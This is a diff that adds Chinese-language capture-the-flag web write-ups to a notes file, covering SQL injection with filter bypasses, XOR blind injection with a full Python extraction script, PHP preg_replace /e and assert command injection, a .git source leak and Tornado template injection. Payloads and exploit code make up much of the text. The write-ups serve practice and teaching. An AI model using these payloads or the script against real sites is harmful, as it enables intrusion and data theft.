@@ -3930,6 +3930,466 @@ data=O:8:"HelloPhp":2:{s:1:"a";s:10:"phpinfo();";s:1:"b";s:6:"assert";}
 {if system('cat /flag')}{/if}		# 使用这个payload即可
 ```
 
+## [SWPU2019]Web1
+
+进来找了好久，最后看了一下，注入点在这里
+
+![image-20231130135838977](CTF.assets/image-20231130135838977.png)
+
+在 广告名 的位置输入：`1'`就会看到报错信息，从报错信息可以判断出，SQL语句大概是：`id='1' limit 1` ，但是这里把SQL注入常用的注释符号都屏蔽了，如：`--+ #`，所以只能用单引号闭合
+
+![image-20231130135920652](CTF.assets/image-20231130135920652.png)
+
+在测试的时候，如果payload种有空格则自动删除，这里要用：`/**/`绕过，这里整个查询的条目数是22，由于这里只能用`'`闭合，所以只能用`union select`做测试，因为`group by 22 '' limit 1`会报错
+
+![image-20231130140127214](CTF.assets/image-20231130140127214.png)
+
+```mysql
+mysql> select * from users where id=1 group by 3 '' limit 1;
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' limit 1' at line 1
+```
+
+可以看到回显位为：2、3
+
+```
+payload：-1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
+```
+
+![image-20231130142826834](CTF.assets/image-20231130142826834.png)
+
+按流程走下一步要获取表名，由于这里屏蔽了`information_schema`，所以这里只能用其他数据库
+
+```
+# SQL注入可用于获取表明的数据库
+sys.schema_auto_increment_columns				# 数据库字段名：table_schema
+sys.schema_table_statistics_with_buffer			# 数据库字段名：table_schema
+mysql.innodb_table_stats						# 数据库字段名：database_name
+```
+
+这里最恶心的地方其实是在`limit`前面有一个`'`要闭合，闭合之后就会导致整个`union`查询报错，如下：
+
+```mysql
+mysql> select * from users where id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() '' limit 1;
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' limit 1' at line 1
+```
+
+要解决这个问题，首先要明确一点，如果`union`查询之后不带上其他参数的话是可以查询成功的，如下：
+
+```mysql
+mysql> select * from users where id=-1 union select 1,2,3 '' limit 1;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | 2        | 3        |
++----+----------+----------+
+1 row in set (0.00 sec)
+```
+
+那么我们只要在`union`中插入一条子查询即可，记得子查询要用括号包裹，如下：
+
+```mysql
+mysql> select * from users where id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 '' limit 1;
++----+-------------------------------+----------+
+| id | username                      | password |
++----+-------------------------------+----------+
+|  1 | emails,referers,uagents,users | 3        |
++----+-------------------------------+----------+
+1 row in set (0.00 sec)
+```
+
+那么以这个思路来获取表名，拿到表明：`ads，users`
+
+```
+payload:
+-1'/**/union/**/select/**/1,2,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
+```
+
+![image-20231130144150687](CTF.assets/image-20231130144150687.png)
+
+### union无列名读取数据
+
+`union`查询中，其实我们也可以将思路调转过来，只要保证`union`查询的条目数左右相等即可，如下：
+
+```mysql
+mysql> select 1,2,3 union select * from users;
++----+----------+------------+
+| 1  | 2        | 3          |
++----+----------+------------+
+|  1 | 2        | 3          |
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
+|  4 | secure   | crappy     |
+|  5 | stupid   | stupidity  |
+|  6 | superman | genious    |
+|  7 | batman   | mob!le     |
+|  8 | admin    | admin      |
+|  9 | admin1   | admin1     |
+| 10 | admin2   | admin2     |
+| 11 | admin3   | admin3     |
+| 12 | dhakkan  | dumbo      |
+| 14 | admin4   | admin4     |
++----+----------+------------+
+14 rows in set (0.00 sec)
+```
+
+因此，我们可以使用嵌套查询，将该表作为一张新的表，其字段名为：1，2，3。然后进行查询，mysql要求***\*每一个派生出来的表都必须有一个自己的别名\**，那我给派生表加上别名即可**：
+
+整条SQL语句执行过程：
+
+1. 先执行子查询
+2. 为子查询出来的表命名一个别名
+3. 使用反引号包裹的`2`表示选择查询名为`2`的列
+
+```mysql
+mysql> select `2` from (select 1,2,3 union select * from users) as tb;
++----------+
+| 2        |
++----------+
+| 2        |
+| Dumb     |
+| Angelina |
+| Dummy    |
+| secure   |
+| stupid   |
+| superman |
+| batman   |
+| admin    |
+| admin1   |
+| admin2   |
+| admin3   |
+| dhakkan  |
+| admin4   |
++----------+
+```
+
+至于这个思路构造出的payload：
+
+这条payload有两个UNION查询，外层UNION查询要配合上`ads`表的22列查询，内层UNION查询则要配合上`users`表的3列查询
+
+```
+-1'/**/union/**/select/**/1,2,(select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select*from/**/users)/**/as tb),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
+```
+
+![image-20231130152356392](CTF.assets/image-20231130152356392.png)
+
+## 攻防世界 ics-05
+
+### 1. preg_replace e模式命令执行
+
+```
+命令格式：preg_replace(pattern, replacement, subject)
+```
+
+`preg_replace`正确用法：会将正则匹配到的字符替换成指定字符
+
+```php
+<?php
+echo preg_replace('/a/', 'b', 'abc');
+
+# 输出
+bbc
+```
+
+在低版本的PHP中，如果是`e`模式下的正则，那么如果正则被成功匹配就会先将参数：`replacement`当做命令执行
+
+```php
+<?php
+# 这里会先执行 phpinfo() 代码再执行正则替换
+echo preg_replace('/a/e', 'phpinfo', 'abc');
+```
+
+### 2. 复现
+
+进来看源码，发现一个提示，这里看上去是一个文件包含，尝试包含`/etc/passwd`成功！
+
+![image-20231201180546885](CTF.assets/image-20231201180546885.png)
+
+![image-20231201180622671](CTF.assets/image-20231201180622671.png)
+
+一开始的想法是，通过在URL里面写入PHP一句话木马再去访问响应的日志文件从而激活这个木马！但是后面一直都找不到具体的日志文件路径。
+
+其实遇到这类题目，应该首先想到想办法去将他的源码弄下来，最后使用PHP伪协议成功拿到源码
+
+```
+?page=php://filter/read=convert.base64-encode/resource=index.php
+```
+
+![image-20231201180846947](CTF.assets/image-20231201180846947.png)
+
+最后拿到源码，这里只展示关键代码，总结
+
+1. HTTP请求头：`X-Forwarded-For: 127.0.0.1`
+2. 执行`preg_replace` e 模式漏洞
+
+```php
+ <?php
+        }
+        }
+
+
+        //方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试
+		# X_FORWARDED_FOR 字段绕过
+		# preg_replace e模式命令执行
+        if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {
+
+            echo "<br >Welcome My Admin ! <br >";
+
+            $pattern = $_GET['pat'];
+            $replacement = $_GET['rep]';
+            $subject = $_GET['sub'];
+
+            if (isset($pattern) && isset($replacement) && isset($subject)) {
+                preg_replace($pattern, $replacement, $subject);
+            } else {
+                die();
+            }
+
+        }
+
+
+        ?>
+
+```
+
+这里很奇怪，我在浏览器用hackbar不回显flag
+
+```
+payload：pat=/123/e&rep=system('cat+./s3chahahaDir/flag/flag.php')&sub=123
+```
+
+![屏幕截图 2023-12-01 181733](CTF.assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-12-01%20181733.jpg)
+
+## 攻防世界 mfw
+
+进来就是名牌要做一个Git泄露测试了
+
+![image-20231201193241508](CTF.assets/image-20231201193241508.png)
+
+使用`GitHack`拿到源码
+
+```bash
+┌──(root㉿kali)-[/home/kali/ctfTool/web/GitHack]
+└─# python GitHack.py http://61.147.171.105:53562/.git/
+[+] Download and parse index file ...
+[+] index.php
+[+] templates/about.php
+[+] templates/contact.php
+[+] templates/flag.php
+[+] templates/home.php
+[OK] templates/contact.php
+[OK] templates/about.php
+[OK] templates/flag.php
+[OK] index.php
+[OK] templates/home.php
+```
+
+源码分析，这里给出关键代码
+
+这里主要是通过`assert`函数断言判断，如果`assert`函数返回true则继续执行，否则就`die()`
+
+```php
+<?php
+
+if (isset($_GET['page'])) {
+	$page = $_GET['page'];
+} else {
+	$page = "home";
+}
+
+$file = "templates/" . $page . ".php";
+
+// I heard '..' is dangerous!
+assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
+
+// TODO: Make this look nice
+assert("file_exists('$file')") or die("That file doesn't exist!");
+
+?>
+```
+
+`$file`是可控的，那么就可以以SQL注入的思路，通过闭合`file_exists`函数的方式执行特定的RCE
+
+```
+payload：
+123') or system('dir');//
+
+payload 分析：
+assert("file_exists('123') or system('dir');//')");
+1. 123 文件不存在，那么返回 false 并执行 system 函数
+2. 使用 // 注释掉后面的 ')
+
+最后payload：123') or system('cat templates/flag.php');//
+```
+
+## 攻防世界 easytornado
+
+### 1. 前置知识
+
+关于有关tornado模板注入可以去看葵花宝典
+
+这里做一个`cookie_secret`的解释，`cookie`和`cookie_secret`是**不同**的，`cookie_secrert`是一把密钥，服务器会将明文`cookie`通过`cookie_secret`加密后发给客户端，并由客户端保管；客户端后续访问则需要拿着密文`cookie`，服务器就会将这串密文`cookie`用`cookie_secret`做解密，以验证客户端的身份
+
+### 2. 复现
+
+访问`hint.php`得到提示
+
+![image-20231201201634689](CTF.assets/image-20231201201634689.png)
+
+在`http://61.147.171.105:65497/error?msg={{7*7}}`存在模板注入漏洞，但是对大部分的关键词都做了屏蔽处理
+
+![image-20231201202024107](CTF.assets/image-20231201202024107.png)
+
+使用payload`{handler.settings}`可成功获取`cookie_secret`
+
+![image-20231201202133787](CTF.assets/image-20231201202133787.png)
+
+最后使用脚本做`md5`哈希算法
+
+```py
+import hashlib
+
+filename_md5 = hashlib.md5('/fllllllllllllag'.encode('utf-8')).hexdigest()
+file_hash = hashlib.md5('c0a990fe-750a-48c8-8726-54f0c55358f1'.encode('utf-8') + filename_md5.encode('utf-8'))
+print(file_hash.hexdigest())
+```
+
+## BUUOJ [极客大挑战 2019]FinalSQL
+
+### 1. 前置知识
+
+#### 1.1 异或运算
+
+**相同为0，不同为1**
+
+如下，如果是多个数字做异或运算，则从左到右逐个计算
+
+```sql
+mysql> select 1^1^1;
++-------+
+| 1^1^1 |
++-------+
+|     1 |
++-------+
+1 row in set (0.00 sec)
+```
+
+#### 1.2 异或盲注
+
+MySQL做布尔运算，True则返回1，False则返回0，如下：
+
+```sql
+mysql> select 1=1;
++-----+
+| 1=1 |
++-----+
+|   1 |
++-----+
+1 row in set (0.00 sec)
+
+mysql> select 1=0;
++-----+
+| 1=0 |
++-----+
+|   0 |
++-----+
+1 row in set (0.00 sec)
+
+```
+
+利用这一特性，就可以对ASCII码最布尔运算来达到异或盲注，记得对SQL语句要用括号包裹，payload如下：
+
+```
+# 爆库
+1^(ascii(substring(database(),1,1))=103)^1
+# 爆表
+1^(select(ascii(substring((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))=70))^1
+# 爆字段
+1^(select(ascii(substring((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())),1,1))=100))^1
+# 爆值
+1^(select(ascii(substring((select(group_concat(fl4gawsl))from(Flaaaaag)),1,1))<100))^1
+```
+
+### 2. 复现
+
+一开始一直找不到注入点，结果在`search.php`
+
+![image-20231201202354429](CTF.assets/image-20231201202354429.png)
+
+可以看到在错误的访问之后会报错
+
+![image-20231201202421958](CTF.assets/image-20231201202421958.png)
+
+直接上脚本，最后flag在`F1naI1y`表的`password`字段中
+
+```py
+import requests
+from time import sleep
+
+# 爆库，payload：1^(ascii(substring(database(),1,1))=103)^1
+# 数据库名：geek
+url = 'http://9b4dd26b-808c-4856-aaff-41da72057a37.node4.buuoj.cn:81/search.php'
+database_name = ''
+for num_name in range(1, 11):
+    for ascii_num in range(65, 123):
+        payload = f"?id=1^(ascii(substring(database(),{num_name},1))={ascii_num})^1"
+        sleep(0.5)
+        print(url + payload)
+        req = requests.get(url + payload)
+        if b'ERROR' not in req.content:
+            database_name += chr(ascii_num)
+            print(f"database_name：{database_name}, HTTP_Code：{req.status_code}")
+            break
+
+print(database_name)
+
+# 爆表
+# table_name：F1naI1y,Flaaaaag
+# payload：1^(select(ascii(substring((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))=70))^1
+table_name = ''
+for table_num in range(1, 21):
+    for ascii_num in range(33, 123):
+        payload = f"?id=1^(select(ascii(substring((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{table_num},1))={ascii_num}))^1"
+        sleep(0.25)
+        req = requests.get(url + payload)
+        if b'ERROR' not in req.content:
+            table_name += chr(ascii_num)
+            print(f"table_name：{table_name}, HTTP_Code：{req.status_code}")
+            break
+print(table_name)
+
+# 爆字段
+# column_name：id,username,password,id,fl4gawsl,
+column_name = ''
+for column_num in range(1, 60):
+    for ascii_num in range(33, 123):
+        payload = f"?id=1^(select(ascii(substring((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())),{column_num},1))={ascii_num}))^1"
+        sleep(0.25)
+        req = requests.get(url + payload)
+        if b'ERROR' not in req.content:
+            column_name += chr(ascii_num)
+            print(f"column_name：{column_name}, HTTP_Code：{req.status_code}")
+            break
+print(column_name)
+
+# 爆值
+# fl4gawsl: NONotthisClickothers
+# payload = ?id=1^(select(ascii(substring((select(group_concat(fl4gawsl))from(Flaaaaag)),1,1))<100))^1
+flag = ''
+for flag_num in range(1,80):
+    for ascii_num in range(33, 126):
+        payload = f"?id=1^(select(ascii(substring((select(group_concat(username,':',password))from(F1naI1y)),{flag_num},1))={ascii_num}))^1"
+        sleep(0.25)
+        req = requests.get(url+payload)
+        if b'ERROR' not in req.content:
+            flag += chr(ascii_num)
+            print(f"flag：{flag}, HTTP_Code：{req.status_code}")
+            break
+print(flag)
+```
+
+
+
 # Misc
 
 ## János-the-Ripper-隐写-压缩包密码破解
